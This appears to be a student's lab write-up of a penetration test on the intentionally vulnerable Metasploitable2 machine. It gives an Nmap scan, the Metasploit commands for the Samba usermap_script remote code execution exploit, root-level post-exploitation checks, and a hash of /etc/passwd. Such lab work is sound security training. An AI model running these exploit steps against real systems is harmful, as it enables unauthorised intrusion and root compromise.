# VAPT Project – Week 2

## Overview

This project demonstrates a complete Vulnerability Assessment and Penetration Testing (VAPT) cycle performed on the Metasploitable2 machine.

---

## Step 1: Reconnaissance

* Checked target IP using `ifconfig`
* Performed scanning using Nmap:
  `nmap -sV 192.168.1.4`

---

## Step 2: Vulnerability Scanning

* Identified open ports such as 21 (FTP), 22 (SSH), 80 (HTTP), 445 (SMB)
* Detected services running on these ports

---

## Step 3: Exploitation

* Used Metasploit Framework
* Exploit used: Samba Usermap Script (RCE)
* Commands:

  ```
  msfconsole
  search samba
  use exploit/multi/samba/usermap_script
  set RHOSTS 192.168.1.4
  run
  ```

---

## Step 4: Post-Exploitation

* Verified access using:

  ```
  whoami
  id
  uname -a
  pwd
  ls
  ```

* Root access was successfully obtained

---

## Step 5: Evidence Collection

* Generated hash using:

  ```
  sha256sum /etc/passwd
  ```

---

## Tools Used

* Kali Linux
* Nmap
* Metasploit

---

## Screenshots

All screenshots are available in the **Screenshots** folder.

---

## Outcome

Successfully performed full VAPT cycle including scanning, exploitation, and post-exploitation with root access.
